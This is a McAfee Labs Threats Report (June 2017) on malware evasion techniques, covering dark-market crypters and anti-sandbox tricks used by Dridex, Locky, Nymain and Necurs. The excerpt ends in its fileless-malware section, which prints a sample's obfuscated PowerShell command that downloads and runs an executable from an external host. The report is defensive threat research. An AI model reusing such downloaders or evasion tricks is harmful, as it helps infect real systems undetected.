McAfee Labs
Threats Report
June 2017

REPORT

There are hundreds, if not thousands, of antisecurity, anti-sandbox, and anti-analyst evasion
techniques employed by malware authors. Many
can be purchased off the shelf.

About McAfee Labs

Introduction

McAfee Labs is one of the world’s leading sources for
threat research, threat intelligence, and cybersecurity
thought leadership. With data from millions of sensors
across key threats vectors—file, web, message, and
network—McAfee Labs delivers real-time threat
intelligence, critical analysis, and expert thinking to
improve protection and reduce risks.

Welcome to the new McAfee!

www.mcafee.com/us/mcafee-labs.aspx
Follow McAfee Labs Blog

Follow McAfee Labs Twitter

On April 3, McAfee became an independent entity, no
longer wholly owned by Intel. The spin-off, a culmination of
months of effort to prepare critical functions and transition
employees to the new entity, is now known as McAfee
LLC. Intel remains a minority owner. Chris Young, who led
McAfee under the Intel umbrella, is the CEO of the new
McAfee. Read Young’s letter to our customers.
In mid-February, we released the report Building Trust in
a Cloudy Sky: The State of Cloud Adoption and Security. The
report looks at cloud adoption, changes in data center
environments, and the challenges with visibility and control
over these new architectures. It is based on responses
from 1,400 IT security professionals from around the
globe.
On March 1, we released the report Tilting the Playing
Field: How Misaligned Incentives Work Against Cybersecurity,
developed in partnership with the Center for Strategic
and International Studies. It examines the mismatch
between the incentives of attackers and defenders. The
report identified three key incentive misalignments:
between corporate structures and the free flow of criminal
enterprises, between strategy and implementation, and
between senior executives and those in implementation
roles.

McAfee Labs Threats Report, June 2017 | 2

In response to the WikiLeaks Vault 7 disclosure on March
7, McAfee developed a simple module for the CHIPSEC
framework that can be used to verify the integrity of EFI
firmware executables on potentially impacted systems.
This work is based on many years of dedicated research
within the field of firmware security, conducted by
McAfee’s Advanced Threat Research group. CHIPSEC is a
framework for analyzing the security of PC platforms that
includes hardware, system firmware (BIOS/UEFI), and
platform components. Read more about the module.
The No More Ransom initiative confirmed the addition
of new members and decryption tools in early April. The
initiative brings together technology companies and law
enforcement agencies from around the world to educate
the public about ransomware and to provide easy access
to decryption tools so that victims need not pay ransoms.
McAfee is a founding member of the No More Ransom
initiative; there are now 89 member companies and
agencies.
Also in April, McAfee’s Strategic Intelligence researchers
released evidence that a series of cyberattacks targeting
the Persian Gulf and, specifically, Saudi Arabia between
2012 and the present are the work of hacker groups
supported and coordinated by a common malicious
actor, and not the random efforts of a variety of
individual cyber gangs in the region. The latest Shamoon
campaigns go beyond a few targets in the energy
industry, to many in other critical sectors that run Saudi
Arabia. Taken together, this new series of Shamoon cyber
espionage campaigns is significantly larger, well-planned,
well-resourced, and coordinated at a level beyond the
limited capacity of disparate independent hacker gangs.

In this quarterly threats report, we highlight three Key
Topics:
■■

■■

■■

We broadly examine evasion techniques
and how malware authors use them to
accomplish their goals. We discuss the
more than 30-year history of evasion by
malware, the underground market for offthe-shelf evasion technology, how several
contemporary malware families leverage
evasion techniques, and what to expect in
the future, including machine learning and
hardware-based evasion.
We explore the very interesting topic of
steganography in the digital world. Digital
steganography hides information in benignlooking objects such as images, audio tracks,
video clips, or text files. Of course, attackers
use these techniques to pass information by
security systems. We explain how in this Key
Topic.
We examine Fareit, the most famous
password-stealing malware. We cover
its origins, its typical infection vectors, its
architecture and inner workings, how it has
changed over the years, and how it was likely
used in the breach of the Democratic National
Committee before the 2016 U.S. Presidential
election.

These Key Topics are followed by our usual in-depth set
of quarterly threats statistics.

Finally, the Verizon 2017 Data Breach Investigations Report
(DBIR) was released in late April. McAfee coauthored a
section of the report in which we highlighted significant
ransomware technical enhancements in 2016 that have
transformed both the nature of the threat and ways in
which the security industry is fighting back.

Share this Report

McAfee Labs Threats Report, June 2017 | 3

And in other news…
NSS Labs, an independent, highly regarded
security product testing lab, recently completed its
comprehensive Advanced Endpoint Protection tests,
in which they examined endpoint products from 13
vendors. They tested the products against a barrage
of advanced threats and evaluated them for overall
security effectiveness and total cost of ownership.
McAfee Endpoint Security (ENS) 10.5 achieved a security
effectiveness rating of 99% with zero false-positives
and 100% of the tested evasions blocked. These results
earned McAfee ENS an NSS Labs Recommended Rating
for Advanced Endpoint Protection. Compared with the
other vendors, McAfee ENS did very well, earning the
second highest security effectiveness rating.

Every quarter, we discover new things from the telemetry
that flows into McAfee Global Threat Intelligence. The
McAfee GTI cloud dashboard allows us to see and
analyze real-world attack patterns that lead to better
customer protection. This information provides insight
into attack volumes that our customers experience. In
Q1, our customers saw the following attack volumes:
■■

■■

■■

■■

■■

McAfee GTI received on average 55 billion
queries per day in Q1.
McAfee GTI protections against malicious
files decreased to 34 million in Q1 from 71
million per day in Q4 due to earlier malware
detection and better local intelligence.
McAfee GTI protections against potentially
unwanted programs showed an increase to
56 million per day in Q1 from 37 million per
day in Q4.
McAfee GTI protections against medium-risk
URLs measured a decrease to 95 million per
day in Q1 from 107 million per day in Q4 due
to improved accuracy.
McAfee GTI protections against risky IP
addresses saw a decrease to 59 million per
day in Q1 from 88 million per day in Q4 due
to earlier detection.

We continue to receive valuable feedback from our
readers through our Threats Report user surveys. If you
would like to share your views about this Threats Report,
please click here to complete a quick, five-minute survey.
Enjoy the summer.
—Vincent Weafer, Vice President, McAfee Labs

Share this Report

McAfee Labs Threats Report, June 2017 | 4

Contents
McAfee Labs Threats Report
June 2017
This report was researched and
written by:
Christiaan Beek
Diwakar Dinkar
Yashashree Gund
German Lancioni
Niamh Minihane
Francisca Moreno
Eric Peterson
Thomas Roccia
Craig Schmugar
Rick Simon
Dan Sommer
Bing Sun
RaviKant Tiwari
Vincent Weafer

Executive Summary

6

Key Topics

7

Malware evasion techniques and trends

8

Hiding in plain sight: The concealed threat
of steganography

33

The growing danger of Fareit, the password stealer

48

Threats Statistics

69

Executive Summary
Malware evasion techniques and trends

There are hundreds, if not
thousands, of evasion techniques
employed by malware authors.
We examine some of these
techniques and how malware
authors use them to accomplish
their goals.

Malware developers began experimenting with ways to evade security
products in the 1980s, when a piece of malware defended itself by partially
encrypting its own code, making the content unreadable by security analysts.
Today, there are hundreds, if not thousands, of anti-security, anti-sandbox,
and anti-analyst evasion techniques employed by malware authors. In this
Key Topic, we examine some of the most powerful evasion techniques,
the robust dark market for off-the-shelf evasion technology, how several
contemporary malware families leverage evasion techniques, and what to
expect in the future, including machine learning evasion and hardwarebased evasion.

Hiding in plain sight: The concealed threat of steganography

Digital steganography hides
information in benign-looking
objects. Attackers use this
technique to pass information
by security systems without
detection. We explain digital
steganography in this Key Topic.

Steganography has been around for centuries. From the ancient Greeks to
modern cyberattackers, people have hidden secret messages in seemingly
benign objects. In the digital world, those messages are most often
concealed in images, audio tracks, video clips, or text files. Attackers use
digital steganography to pass information by security systems without
detection. In this Key Topic, we explore the very interesting field of digital
steganography. We cover its history, common methods used to hide
information, its use in popular malware, and how it is morphing into
networks. We conclude by providing policies and procedures to protect
against this form of attack.

The growing danger of Fareit, the password stealer

Password stealers are used in
the early stages of nearly all
attacks. Fareit, the most famous
password-stealing malware, was
likely used in the DNC breach
before the 2016 U.S. Presidential
election. We examine Fareit in
this Key Topic.

People, businesses, and governments increasingly depend on systems and
devices that are protected only by passwords. Often, these passwords are
weak or easily stolen, creating an attractive target for cybercriminals. We
dissect Fareit, the most famous password-stealing malware, in this Key Topic.
We cover its origin in 2011 and how it has changed since then; its typical
infection vectors; its architecture, inner workings, and stealing behavior;
how it evades detection; and its role in the Democratic National Committee
breach before the 2016 U.S. Presidential election. We also offer practical
advice on avoiding infection by Fareit and other password stealers.

Share this Report

McAfee Labs Threats Report, June 2017 | 6

Key Topics
Malware evasion techniques and
trends
Hiding in plain sight: The concealed
threat of steganography
The growing danger of Fareit, the
password stealer

Share feedback

Key Topics

Malware evasion techniques and trends
—Thomas Roccia
Technology advances have significantly changed our lives during the past
decade. We rely on computers of various sorts for even the simplest of daily
tasks and become stressed when they are not available or do not perform as
we expect. The data that we create, use, and exchange has become the gold
of the 21st century. Because our information is so valuable and often very
personal, attempts to steal it have proliferated.
Malware was first developed as a challenge, but soon attackers recognized
the value of stolen data and the cybercrime industry was born. Security
companies, including McAfee, soon formed to defend people and systems
using antimalware technologies. In response, malware developers began
experimenting with ways to evade security products.
The first evasion techniques were simple because the antimalware products
were simple. For example, changing a single bit in a malicious file was
sometimes good enough to bypass the signature detection of a security
product. Eventually, more complex mechanisms such as polymorphism or
obfuscation arrived.

The first malware evasion
techniques were simple because
antimalware products were
simple. Today’s malware evasion
techniques are sophisticated and
powerful.

Today’s malware is very aggressive and powerful. Malware is no longer
developed just by isolated groups or teenagers who want to prove something.
It is now developed by governments, criminal groups, and hacktivists, to spy
on, steal, or destroy data.
This Key Topic details today’s most powerful and common evasion techniques
and explains how malware authors try to use them to accomplish their goals.

Why use evasion techniques?
To perform malicious actions, attackers create malware. However, they cannot
achieve their goals unless their attempts remain undetected. There is a catand-mouse game between security vendors and attackers, which includes
attackers monitoring the operations of security technologies and practices.
The term evasion technique groups all the methods used by malware to avoid
detection, analysis, and understanding.
We can classify evasion techniques into three broad categories:
■■

■■

■■

Anti-security techniques: Used to avoid detection by antimalware
engines, firewalls, application containment, or other tools that
protect the environment.
Anti-sandbox techniques: Used to detect automatic analysis and
avoid engines that report on the behavior of malware. Detecting
registry keys, files, or processes related to virtual environments lets
malware know if it is running in a sandbox.
Anti-analyst techniques: Used to detect and fool malware
analysts, for example, by spotting monitoring tools such as Process
Explorer or Wireshark, as well as some process-monitoring tricks,
packers, or obfuscation to avoid reverse engineering.

Share this Report

McAfee Labs Threats Report, June 2017 | 8

Key Topics

Some advanced malware samples employ two or three of these techniques
together. For example, malware can use a technique like RunPE (which
runs another process of itself in memory) to evade antimalware software, a
sandbox, or an analyst. Some malware detects a specific registry key related
to a virtual environment, allowing the threat to evade an automatic sandbox
as well as an analyst attempting to dynamically run the suspected malware
binary in a virtual machine.
It is important for security researchers to understand these evasion
techniques to ensure that security technologies remain viable.
We see frequent use of several types of evasion techniques:

Evasion Technique Use by Malware

18.3%

23.3%
Anti-sandbox
Anti-security tools
Code injection

16.1%

Anti-debugging

21.2%

Anti-monitoring

21.1%

Source: Virus Total and McAfee, 2017.

Anti-sandboxing has become more prominent because more businesses are
using sandboxes to detect malware.

Definitions
In the world of cybersecurity evasion, certain terms are popular. Here are
some of the tools and terms used by attackers.
■■

There are many types of evasion
techniques, all designed to hide
malware from detection.

■■

■■

Share this Report

Crypter: Encrypts and decrypts malware during its execution.
Using this technique, malware is often not detected by
antimalware engines or static analysis. Crypters are often custom
made and can be bought in underground markets. Custom
crypters make decryption or decompiling even more challenging.
Aegis Crypter, Armadillo, and RDG Tejon are examples of advanced
crypters.
Packer: Similar to a crypter. A packer compresses a malware file
instead of encrypting it. UPX is a popular packer.
Binder: Connects one or more malware files into one. A malware
executable can be bound with a JPG file, but the extension will
remain EXE. Malware authors usually bind a malware file with a
legitimate EXE file.
McAfee Labs Threats Report, June 2017 | 9

Key Topics

■■

■■

Pumper: Increases the size of a file, allowing the malware to
sometimes bypass antimalware engines.
FUD: Fully UnDetectable by antimalware. Used by malware sellers
to describe and promote their tools. A successful FUD program
combines both scantime and runtime elements to be 100%
undetected. We know two types of FUD:
––FUD scantime: Protects a malware file from detection by
antimalware engines before the former runs.
––FUD runtime: Protects a malware file from detection by
antimalware engines while it runs.

■■

■■

■■

■■

■■

■■

■■

Stub: Usually contains the routine used to load (decryption or
decompression) the original malware file into memory.
Unique stub generator: Creates a unique stub for each running
instance, making detection and analysis more difficult.
Fileless malware: Infects a system by inserting itself into memory
and not writing a file to disk.
Obfuscation: Makes malware code difficult for humans to
understand. Plain-text strings are encoded (XOR, Base64, etc.) and
inserted into the malware file, or junk functions are added to the
file.
Junk code: Adds useless code or fake instructions to the binary to
fool the disassembly view or waste analyst time.
Anti’s: Sometimes used on underground forums or marketplaces
to define all the techniques used to bypass, disable, or kill
protection or monitoring tools.
Virtual machine packer: Some advanced packers employ the
concept of a virtual machine. When the malware EXE file is packed,
the original code is translated into the byte code of the virtual
machine and will emulate the behavior of a processor. VMProtect
and CodeVirtualizer use this technique.

Figure 1: Examples of evasion tools.
Share this Report

McAfee Labs Threats Report, June 2017 | 10

Key Topics

A brief history
Malware evasion techniques have become far more numerous and
sophisticated since they first appeared in 1980. Here are the major milestones
in the evolution of evasion techniques:

Major Milestones in the Evolution of Evasion Techniques

00K6Y01
0BJ1Y01
009PS01
1980

1998

1999–2003

2011

2015–2017

Cascade Virus

Metamorphism
Malware

Rootkits

Oﬀ-the-Shelf
Marketplace

Firmware
Malware

Silkroad is ﬁrst dark
net market selling
products and
services for malware
evasion.

Equation Group and
Hacking Team leaks
reveal the use of
ﬁrmware malware to
remain undetected.

First virus using
encryption to
scramble its content.

Regswap uses
metamorphism via
diﬀerent registers
for the same
functions.

In 1999, the ﬁrst
Windows rootkit—
NTRootkit—appears,
followed by
HackerDefender in
2003.

1990

1990s

2008

2015–2017

Chameleon
Family Virus

Packers

Domain
Generation
Algorithms

Dridex, Locky

First polymorphic
viruses.

Packers that encrypt
or compress become
popular due to the
smaller size of RAM
and disks.

The Conﬁcker worm
uses a DGA to evade
network detection.

First large-scale
obfuscation, use of
PowerShell, and
sandbox evasion.

Source: McAfee, 2017.

The first known virus that attempted to defend itself from antimalware
products was the MS-DOS virus Cascade. It defended itself by partially
encrypting its own code, making the content unreadable by security analysts.

Figure 2: MS-DOS virus Cascade in action.

Share this Report

McAfee Labs Threats Report, June 2017 | 11

Key Topics

Figure 3: A disassembled view of Cascade.

In Figure 3, we can see part of Cascade’s code. The red highlight is
automatically generated by the disassembler and indicates that the rest
of the code does not exist. This is because the encrypted code needs to
be decrypted. An easy way to unravel this type of malware is to run the
executable and let the decryption routine decrypt the rest of the code.
In early 1990, the security industry discovered Chameleon, the first
polymorphic virus. Chameleon was highly encrypted and included junk code.
To make the analysis by researchers more difficult, several instructions were
scrambled with every new infection.
Subsequent malware developments introduced polymorphism, packers,
rootkits, obfuscation, and other evasion techniques. Once dark markets began
selling off-the-shelf malware, inexperienced attackers joined the crime wave.

Evasion technology without coding
The use of evasion techniques by malware authors is fundamental to success.
Cybercriminals—even amateurs—understand this, so a lively and easily
accessible market has developed for these evasion techniques.

Share this Report

McAfee Labs Threats Report, June 2017 | 12

Key Topics

Figures 4–6: Examples of crypter tools found on the Internet.

Evasion techniques can be
purchased off the shelf, allowing
authors to “outsource” this part
of their malware development
process. Some even offer unique
evasion techniques as a service.

Evasion techniques on dark markets
Some sellers have compiled several evasion techniques into one tool and offer
them for sale on underground markets to sophisticated malware creators or
their affiliates who are responsible for spreading malware in support of large
campaigns.

Share this Report

McAfee Labs Threats Report, June 2017 | 13

Key Topics

Figure 7: Evasion tools are sometimes available at low prices. Some sellers who have compiled
several crypters and packers probably bought or stole them on the Internet, bundled them,
and then offered the bundle for sale.

Figure 8: Other sellers develop their own tools and keep the source code to avoid analysis
and detection. The price is higher because the tools (presumably) cannot be distributed by
another party.

Share this Report

Figure 9: Some sellers offer a service to make a FUD file. The service is more expensive,
likely due to the providers using advanced techniques such as code manipulation, high
obfuscation, or other tricks with their own custom crypters.

McAfee Labs Threats Report, June 2017 | 14

Key Topics

Figure 10: It is also possible to purchase a certificate to sign any piece of malware, thus
bypassing operating system security.

We see considerable variation in prices and services for sale. A service will be
more expensive than just a compilation of tools that are probably detected by
antimalware products.

Dark Market Evasion Tools for Sale
Type of Product/
Service

Cost

Crypter services for stubs. Sellers get
stubs from buyers and claim to make
them FUD again.

1 file

$53 .71

[FUD] Lazer Crypter

Free packer

Unlimited

Free

[Macro Exploit Crypt Service]
Spread Your EXE Like a Pro

Service to create malicious macros for
spreading malware.

1 file

$53 .37

Amuse Crypt V2

Basic crypter

Unlimited

$0 .50

Arctic Miner—
Silent CPU & GPU
[FUD|Startup|Idle|Injection|
Persistence]

A crytocurrency miner. The author
claims that it is FUD. The tools are
delivered with several evasion
techniques.

Unlimited

$3 .20

BetaCrypt

BetaCrypt code-mutation technology to
alter output code and ensure a long FUD
time.

1-month license

Dark Market Name

Description

[Crypt Service] Make Your
File FUD Again!

$239 .00

Share this Report

McAfee Labs Threats Report, June 2017 | 15

Key Topics

Type of Product/
Service

Cost

Crypter services specializing in ASM or
C files. Claims advanced functions (not
another .Net crypter), samples tested on
several systems, claims to work with any
RAT/bot/malware.

Unlimited

$35 .00

Biggest Crypter Pack/70+ Pro
Crypters/Best Price

Package of 72 packers

Unlimited

$2 .99

Carb0n Crypter 1.8

Basic crypter

Unlimited

$0 .94

Crypter Source Codes/
Huge Pack/Create your own
crypter! Make your malware
undetectable

Package of crypter source code

Unlimited

$1 .99

Crypters and Binders

Pack of multiple crypter and binder tools

Unlimited

$7 .70

Crypters Pack (372 items)

Package of packers

Unlimited

$1 .99

CyanoBinder - Binder - Only
$14 - Hide Your Malware
- Cheap - Customizable
- Powerful - Full Lifetime
License

Advanced binder for joining files
(executables, malware, pictures, movies)
into one executable file.

Lifetime license of
CyanoBinder and full
support

$14 .00

Data Protector

Tool to secure program content from
researchers and crackers, and to
prevent detection by antimalware
programs.

45-day license

$75 .00

EXE FUD Crypt Service Long
FUD 100% 0/45 for RAT,
Malware, Ransomware,
Botnet

Service for a FUD binary. The actors
claim their service is a long-term FUD.

FUD crypt service

$400 .00

How to Create a FUD
Backdoor Bypass Antivirus

Tutorial to create a crypter

Tutorial

$0 .94

HQ Installs

Crypter services for malware. Actors ask
to send ransomware-only bot.

Crypter

$85 .00

Infinity Crypter Cracked

Basic crypter

Unlimited

$0 .99

Java Crypter

A type of FUD crypter that will protect
files using private encryption and
obfuscation methods.

1-month license

$80 .00

Dark Market Name

Description

BHGroup high-quality
crypting service (FUD/Native/
Small Stub/Great execute)

Share this Report

McAfee Labs Threats Report, June 2017 | 16

Key Topics

Type of Product/
Service

Dark Market Name

Description

Cost

New Office Exploit Macros
Builder FUD

Macro creator for Microsoft Office.
Actors claim “almost FUD.”

Unlimited

$4 .00

Octopus Protector C++

Mainly an executable file protector,
although it offers many other functions.
Protects an executable, completely
hiding its actual structure and code.
Helps protect it from being reverse
engineered, analyzed, or cracked.

1 stub for monthly
purchases.

$60 .00

12 stubs for 6-month
membership (2 stubs
each month).
24 stubs for 12-month
membership (2 stubs
each month).

Private Crypter

Crypter combines encryption,
obfuscation, and code manipulation.
Actors claim vast experience in FUD
crypting software.

45-day license

Sick Crypter

Basic crypter

Unlimited

$157 .71

$0 .94

Evasion techniques used by organized criminals and security companies
Hacker organizations are also interested in evasion techniques. In 2015, the
Hacking Team revealed some techniques used to infect and spy on systems.
Their powerful UEFI/BIOS rootkit could infect without detection. In addition,
the Hacking Team developed their own core-packer to FUD their tools.
Security companies that offer penetration testing services are aware of and
use these techniques, allowing pen testers to create an intrusion like a real
hack.
The Metasploit suite, Veil-Evasion, and Shellter allow pen testers to protect
their “malicious” binaries. Security researchers are constantly looking for
these techniques before attackers find them. We have seen the recent threat
DoubleAgent trigger antimalware solutions.

Evasion techniques in action
During the past year, we have analyzed many malware samples that contain
evasion capabilities. In a typical attack, attackers use evasion techniques at
many steps in the attack flow.

Share this Report

McAfee Labs Threats Report, June 2017 | 17

Key Topics

Evasion Techniques in a Typical Attack Sequence
Infection Vector
■■

■■

Obfuscation

■■

Sandbox detection

Antimalware vendor
network detection

Malware Delivery
■■

Packing file

■■

Obfuscation

■■

Anti-debugging

■■

Fake metadata

Malware Behavior
■■

Sandbox evasion

■■

Code injection

■■

Bypass antimalware/
user account control

■■

Self-deletion

Actions on Objectives
■■

Network evasion

■■

Stealth

■■

Encryption

■■

TOR network

Dridex banking Trojan
Dridex (also known as Cridex) is a well-known banking Trojan that first
appeared in 2014. This malware steals banking credentials and spreads
through email attachments in Word files that contain malicious macros.
There have been several Dridex campaigns since 2014. In each succeeding
campaign, we have observed the addition and enhancement of evasion
techniques.

The well-known banking Trojan
Dridex relies heavily on evasion
for its infection vectors.

Dridex relies heavily on evasion for its infection vectors. We analyzed several
samples.

GET http://croningroup.com/73/20.exe

Figure 11: We can see the obfuscation of the function names and data. This obfuscation is
trivial because it uses ASCII numbers. (Hash: 610663e98210bb83f0558a4c904a2f5e)
Share this Report

McAfee Labs Threats Report, June 2017 | 18

Key Topics

Other variants use more advanced techniques.

https://www.maxmind.com

PowerShell
command with
bypass execution
policy

Figure 12: This sample uses the evasion technique of string and content obfuscation,
PowerShell with a bypass execution policy, and checking the IP address on maxmind.com
against a blacklist of antimalware vendors. (Hash: e7a35bd8b5ea4a67ae72decba1f75e83)

In another sample, the Dridex infection vector tries to detect a virtual
environment or a sandbox by checking the value of the registry key “HKLM\
SYSTEM\ControlSet001\Services\Disk\Enum” to search for strings such as
“VMWARE” or “VBOX.” When a virtual machine or a sandbox is detected, Dridex
does not run, appears to be harmless, or attempts to crash the system.
Evasion techniques are widely used in infection vectors to avoid detection
and understanding by analysts. Dridex combines several techniques to avoid
detection or analysis in multiple attack stages.

■■

zzcasr.exe 1340
––edg1.exe 1588
■■

■■

rundll32.exe 1720

Explorer.exe 1420

Process hollowing

DLL injection

Figure 13: In this example, Dridex uses the process hollowing evasion technique to inject
malicious code into a suspended process. Then a new process calls rundll32.exe, which
loads the malicious DLL into explorer.exe.

A recent Dridex sample uses the new evasion technique “AtomBombing.” This
technique uses the Atom Tables, which are provided by the operating system
to allow applications to store and access data. Atom Tables can also be used
to share data between applications.
It is possible to inject malicious code into Atom Tables and force a legitimate
application to execute that code. Because the techniques used to inject
malicious code are well known and easily detected, attackers are now
changing their techniques.

Share this Report

Finally, the final Dridex payload generally uses obfuscation and encryption to
protect data such as the control server URL, botnet information, and the PC
name contained inside the malicious binary.

McAfee Labs Threats Report, June 2017 | 19

Key Topics

The Locky ransomware family
uses many of the same evasion
techniques as Dridex, but
has added additional evasion
techniques over time.

Locky ransomware
Locky is one of the most prominent ransomware families to arrive in 2016.
It uses many methods to infect systems. Some of its evasion techniques are
similar to Dridex’s.

Figure 14: One Locky infection vector used basic obfuscation with Unicode and random
strings for functions. (Hash: 2c01d031623aada362d9cc9c7573b6ab)

In the preceding instance, deobfuscation is trivial because it is easy to reverse
Unicode, an encoding standard for printing text in different formats. Each
Unicode character in this snippet corresponds to an ASCII character.

ASCII

Unicode

Hexadecimal

A

0041

41

Figures 15–16: In this (deobfuscated) infection vector, the code is downloading an EXE file
into the TEMP folder from an external URL.

Other Locky samples use multiple stages with XOR encryption to avoid
detection and bypass email filtering and web gateways.
Some Locky variants use the Nullsoft Scriptable Install System, which
compresses files. This legitimate app has become more commonly used by
malware to bypass antimalware engines. An NSIS file can be unzipped directly
to get the content.

Share this Report

McAfee Labs Threats Report, June 2017 | 20

Key Topics

Figure 17: In this example of Locky, we see many garbage files designed to waste analyst
time. All these files are compressed by the NSIS app. Only some are used to perform
malicious actions on the target system. (Hash: 5bcbbb492cc2db1628985a5ca6d09613)

In addition to obfuscating executable formats, Locky uses tricks to bypass
firewall and control server detection over the network. Some Locky variants
use a domain generation algorithm, a technique that allows for the dynamic
creation of domains. Locky authors have changed and updated their evasion
techniques with each new campaign.
In August 2016, Locky started to use a command-line argument to evade
automated sandbox analysis. Without the command line, the sample will not
run on the system and the payload will not be decoded into memory.

Figure 18: In this example, the command-line parameter “123” is passed by the infection
vector, a JavaScript file. Then, the command-line parameter is read by the Windows API
GetCommandLine and CommandLineToArgvW. (Hash: 0fed77b29961c0207bb4b7b033ca3fd4)
Share this Report

McAfee Labs Threats Report, June 2017 | 21

Key Topics

The parameter for this sample is used to decrypt and unpack the payload into
memory. If the parameter is not correct, the sample simply crashes as it tries
to run encrypted code.
Another trick by Locky, and other malware, is the use of the Read TimeStamp Counter (RDTSC) x86 instruction to detect a virtual environment. The
time-stamp counter counts the number of processor cycles since a reset.
The instruction RDTSC simply returns the value of the counter stored in the
registers edx:eax.
On a physical host, two consecutive RDTSC instructions take a small number
of cycles. On a virtual host, this number of cycles will be bigger. If the value
returned is not the value expected, the sample goes dormant.

Figure 19: The instructions in the Windows API calls GetProcessHeap and CloseHandle are
used to increase the amount of processor cycles. (The instructions per cycles, IPC, estimate
the performance of a processor.) Locky compares the amounts and if it takes 10 times more
cycles to perform CloseHandle than GetProcessHeap, the malware concludes it is running in
a virtual machine. (Hash: 0bf7315a2378d6b051568b59a7a0195a)

The Nymain downloader uses
a combination of anti–reverse
engineering techniques with
obfuscation and sandbox
detection as well as a campaign
timer.

Nymain downloader
Nymain delivers malware such as Trojans or ransomware. Nymain uses
several evasion mechanisms to avoid analysis and detection—a combination
of anti–reverse engineering techniques with obfuscation and sandbox
detection as well as a campaign timer.
Most malware use fake metadata to appear legitimate. The metadata includes
information about the program such as FileVersion, CompanyName, and
Languages. Other samples use stolen certificates to appear legitimate.

Share this Report

McAfee Labs Threats Report, June 2017 | 22

Key Topics

Figure 20: Metadata used by Nymain. (Hash: 98bdab0e8f581a3937b538d73c96480d)

Figure 21: Anti-debugging tricks used by Nymain to avoid dynamic analysis by a debugger.

The most common but also the easiest to bypass is the function
IsDebuggerPresent. The code calls the Windows API and sets a value in
a register. If the value is not equal to zero, then the program is currently
debugged. In that case, the malware terminates the process with the API
TerminateProcess. Another bypass debugger trick is the call FindWindow. If a
window is related to a debugger, such as OllyDbg or Immunity Debugger, this
API detects it and shuts down the malware.
Nymain performs additional checks to avoid analysis:
■■

■■

■■

■■

Check the date and do not execute after the end of the campaign.
Check whether the malware’s filename hash is on the system. If it
is, an analysis could be underway.
Check for a MAC address related to a virtual environment.
Check the registry key HKLM\HARDWARE\Description\
System\”SystemBiosVersion” to find the string “VBOX.”

■■

Insert junk code, resulting in disassembler “code spaghetti.”

■■

Use a domain generation algorithm to evade network detection.

Share this Report

McAfee Labs Threats Report, June 2017 | 23

Key Topics

The Necurs Trojan focuses on
detecting and evading sandbox
analysis.

Necurs Trojan
Necurs is a Trojan that takes control of a system and delivers other malware.
Necurs is one of the largest botnets, with more than six million nodes in 2016.
Necurs began to deliver Locky in 2016.

Figure 22: Necurs uses several mechanisms to avoid detection and analysis. (Hash:
22d745954263d12dfaf393a802020764)

Figure 23: The CPUID instruction returns information about the CPU and allows the
malware to detect if it is running in a virtual environment. If the answer is yes, then the
malware will not run.

Share this Report

McAfee Labs Threats Report, June 2017 | 24

Key Topics

Figure 24: A second evasion technique uses the Windows API call GetTickCount to retrieve
the time since the system was started. It then performs several actions and again retrieves
the elapsed time. This technique is used to detect a debugging tool. If the time retrieved is
longer than expected, the file is currently being debugged. The malware will terminate the
process or crash the system.

Figure 25: An old but still effective evasion technique is querying the input/output
communication port used by VMware. Malware can query this port using the magic number
“VMXh” with the x86 “IN” instruction. During execution, the IN instruction is trapped by the
virtual machine and emulated. The result returned from the instruction and stored in the
register ebx is then compared to the magic number “VMXh.” If the result matches, the malware
is running on VMware and will terminate the process or attempt to crash the system.

Share this Report

McAfee Labs Threats Report, June 2017 | 25

Key Topics

Figure 26: The VMCPUID instruction is similar to CPUID, though this instruction is
implemented only on some virtual machines. If the VMCPUID instruction is not
implemented, it results in a system crash, preventing analysis by a virtual machine.

Figure 27: The VPCEXT instruction (visual property container extender) is another anti–
virtual machine trick used by Necurs to detect virtual systems. This technique is not
documented, and is used by several other bots. If the execution of the instruction does not
generate an exception, then the malware is running on a virtual machine.

Fileless malware
Some malware infects a system without writing a file to disk, thereby evading
many types of detection. We first wrote about fileless malware in the McAfee
Labs Threats Report: November 2015.

Share this Report

McAfee Labs Threats Report, June 2017 | 26

Key Topics

Fileless malware evades
detection by not writing any
file to disk, where security
technologies usually look for
malware.

We now see PowerShell used as an infection vector. In one sample, a simple
JavaScript file runs an obfuscated PowerShell command to download a packed
or armored file from an external IP address. The file injects a malicious DLL
into a legitimate process, bypassing all protection. This malware type is not
completely fileless, but it is still effective.
The following example (hash: f8b63b322b571f8deb9175c935ef56b4) shows
the infection process:

wscript.exe “C:\fattura_631269.js”
cmd.exe /c “powershell $upec=’^kp’’,$pa’;$irrac=’^cess $p’;$burnecc=’^ypass -’;$ahak=’^ct Syst’;$osvyxp=’^
$path=’;$qykni=’^em.Net.’;$egegu=’^pin.no/’;$ypdyxka=’^Webclie’;$qsirdews=’^Scope P’;$yzop=’^
gzabf.e’;$jybzyws=’^($env:t’;$imnef=’^dail-al’;$inbex=’^ew-Obje’;$ihdimu=’^Set-Exe’;$jryzbo=’^nt).
Dow’;$rygmy=’^rocess;’;$plolpi=’^xe’’);(N’;$emyske=’^point.g’;$pytnysz=’^cutionP’;$uglidl=’^p://
sau’;$qiwxud=’^emp+’’\a’;$hepu=’^art-Pro’;$sibgij=’^ath’;$gtotuhd=’^olicy B’;$ynok=’^le(‘’htt’;$evjapi=’^th);
St’;$irjuv=’^nloadFi’; Invoke-Expression
($ihdimu+$pytnysz+$gtotuhd+$burnecc+$qsirdews+$rygmy+$osvyxp+$jybzyws+$qiwxud+$yzop+$plolpi
+$inbex+$ahak+$qykni+$ypdyxka+$jryzbo+$irjuv+$ynok+$uglidl+$imnef+$egegu+$emyske+$upec+$evjapi
+$hepu+$irrac+$sibgij);\”)
powershell.exe powershell $upec=’kp’’,$pa’;$irrac=’cess $p’;$burnecc=’ypass -’;$ahak=’ct
Syst’;$osvyxp=’$path=’;$qykni=’em.Net.’;$egegu=’pin.no/’;$ypdyxka=’Webclie’;$qsirdews=’Scope P’;
$yzop=’gzabf.e’;$jybzyws=’($env:t’;$imnef=’dail-al’;$inbex=’ew-Obje’;$ihdimu=’Set- Exe’;$jryzbo=’nt).
Dow’;$rygmy=’rocess;’;$plolpi=’xe’’);(N’;$emyske=’point.g’;$pytnysz=’cutionP’;$uglidl=’p://sau’;$qiwxud=’emp+’’\
a’;$hepu=’art-Pro’;$sibgij=’ath’;$gtotuhd=’olicy B’;$ynok=’le(‘’htt’;$evjapi=’th); St’;$irjuv=’nloadFi’;InvokeExpression
($ihdimu+$pytnysz+$gtotuhd+$burnecc+$qsirdews+$rygmy+$osvyxp+$jybzyws+$qiwxud+$yzop+$
